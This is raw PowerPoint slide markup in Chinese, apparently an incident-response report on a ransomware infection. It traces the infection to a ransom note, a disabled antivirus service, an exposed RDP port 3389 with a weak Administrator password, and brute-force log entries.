              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>）事件分析</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="568447972"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:fade/>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452022-30A0-A243-B211-B254CB56C5D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="473274" y="884435"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="5"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2492896"/>
            <a:ext cx="4347970" cy="3288779"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="28676"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700808"/>
            <a:ext cx="4413983" cy="315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7898788"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:fade/>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B124DB-4951-AB46-AFE2-282B5329B315}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544"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0722" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="539552" y="1628800"/>
            <a:ext cx="7850981" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>桌面存在敲诈文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>“FILES ENCRYPTED.txt”,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>内容为敲诈者的勒索信息，疑似攻击者邮箱为：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>stopstorage@qq.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片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2996952"/>
            <a:ext cx="7119938" cy="3082529"/>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8173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additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="30722"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="307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2F48BD-0EF9-1348-86A0-B039EB3A8C0E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="485775"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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="组合 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="251520" y="1472183"/>
            <a:ext cx="4752527" cy="3450552"/>
            <a:chOff x="251520" y="1472183"/>
            <a:chExt cx="4752527" cy="3450552"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="32770" name="文本框 2"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="251520" y="1472183"/>
              <a:ext cx="4752527" cy="553998"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle>
              <a:defPPr>
                <a:defRPr lang="en-US"/>
              </a:defPPr>
              <a:lvl1pPr>
                <a:lnSpc>
                  <a:spcPct val="150000"/>
                </a:lnSpc>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r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Step3:</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
                <a:t>该</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>email</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
                <a:t>地址已有多起攻击事件</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>。</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>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102281"/>
              <a:ext cx="3816424" cy="2820454"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:no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grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="7" name="组合 6"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4608940" y="2147814"/>
            <a:ext cx="4322320" cy="4117380"/>
            <a:chOff x="4608940" y="2147814"/>
            <a:chExt cx="4322320" cy="4117380"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5"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0159" y="3163477"/>
              <a:ext cx="3979881" cy="3101717"/>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
          <p:nvSpPr>
            <p:cNvPr id="6" name="文本框 2"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4608940" y="2147814"/>
              <a:ext cx="4322320" cy="707886"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle>
              <a:defPPr>
                <a:defRPr lang="en-US"/>
              </a:defPPr>
              <a:lvl1pPr>
                <a:lnSpc>
                  <a:spcPct val="150000"/>
                </a:lnSpc>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pPr>
                <a:lnSpc>
                  <a:spcPts val="2400"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Step4: </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
                <a:t>查看系统进程，发现天擎的相关防护服务已被关闭</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>。</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28037659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CAA026-8269-F649-85B6-D426F181CAC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="516595" y="76470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4818" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="323528" y="1335918"/>
            <a:ext cx="7850981" cy="553998"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step5: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>进一步排查，发现服务器对外开放了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3389</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>远程桌面管理端口；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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060640"/>
            <a:ext cx="5040560" cy="3492919"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="5"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2996744"/>
            <a:ext cx="4392488" cy="3096552"/>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5556758"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:fade/>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45F928-CD10-9C4F-ADBA-2157FB1272F2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="634207"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5842" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="610955" y="1487470"/>
            <a:ext cx="8281525" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step6: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Administrator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>账户口令为弱口令，且自系统安装以来未修改过密码：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="35843"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040" y="2550874"/>
            <a:ext cx="4112399" cy="3457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3968" y="2996952"/>
            <a:ext cx="4536504" cy="3269818"/>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2228445"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:fade/>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2AFF6C-9C29-BB44-AF04-85F9085B20B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544"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7890" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="971600" y="2348880"/>
            <a:ext cx="7234897" cy="1938992"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>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r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器中</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>敲诈者</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>病毒，磁盘文件被全盘加密，目前暂时无法解密，只能通过重装操作系统来恢复，事件原因是黑客通过服务器</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>3389</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>端口弱口令进入，并上传加密程序执行加密</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="1755177"/>
            <a:ext cx="1577676" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>）结论</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mj-ea"/>
              <a:ea typeface="+mj-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1608238374"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:fade/>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92D594-96D2-F64B-A314-C4730C0D384B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="89454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8914" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="666800" y="2348880"/>
            <a:ext cx="7865640" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr>
              <a:defRPr sz="2400" b="1">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step1:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>应急响应小组成员在通过登录被加密感染的数据库服务器，发现其桌面上弹出勒索软件提示窗口</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="38915"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3218240"/>
            <a:ext cx="5973952" cy="272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483438" y="1789600"/>
            <a:ext cx="2196435" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>）事件分析</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2483453486"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:fade/>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55E52E-F9F2-694C-B7D9-FE26D2E3F8F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="82986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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="7" name="组合 6"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4446003" y="1906615"/>
            <a:ext cx="4518485" cy="4390750"/>
            <a:chOff x="4446003" y="1906615"/>
            <a:chExt cx="4518485" cy="4390750"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="41986" name="文本框 2"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4634893" y="1906615"/>
              <a:ext cx="4041563" cy="646331"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle>
              <a:defPPr>
                <a:defRPr lang="en-US"/>
              </a:defPPr>
              <a:lvl1pPr>
                <a:defRPr sz="2000" b="1">
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:defRPr>
              </a:lvl1pPr>
            </a:lstStyle>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Step3:</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0"/>
                <a:t>通过对系统日志进行分析，发现大量的远程桌面服务爆破日志</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
                <a:t>。</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="图片 3" descr="../../../Desktop/屏幕快照%202017-12-21%20下午2.17.3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6003" y="2860005"/>
              <a:ext cx="4518485" cy="3437360"/>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grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="组合 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="107504" y="1444950"/>
            <a:ext cx="4392488" cy="4444604"/>
            <a:chOff x="107504" y="1444950"/>
            <a:chExt cx="4392488" cy="4444604"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="文本框 2"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="251520" y="1444950"/>
              <a:ext cx="4248472" cy="923330"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle>
              <a:defPPr>
                <a:defRPr lang="en-US"/>
              </a:defPPr>
              <a:lvl1pPr>
                <a:defRPr sz="1800" b="1">
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:defRPr>
              </a:lvl1pPr>
            </a:lstStyle>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Step2:</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
                <a:t>通过对被加密文件进行索引，发现加密的开始时间为</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>2017</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
                <a:t>年</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>12</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
                <a:t>月</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>X</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
                <a:t>日</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>X</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
                <a:t>点</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>09</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
                <a:t>分</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
                <a:t>13</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
                <a:t>秒</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
                <a:t>。</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6"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2431334"/>
              <a:ext cx="4256341" cy="3458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2905859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5978F0-E44B-5E47-BA18-AA0F61AAEFA4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="318691" y="71434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43010" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="318691" y="1301708"/>
            <a:ext cx="8604448" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="en-US"/>
            </a:defPPr>
            <a:lvl1pPr>
              <a:defRPr sz="1800" b="1">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step4:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>同时，于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> 2017</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>年</a:t>
            </a:r>
            <a:r>
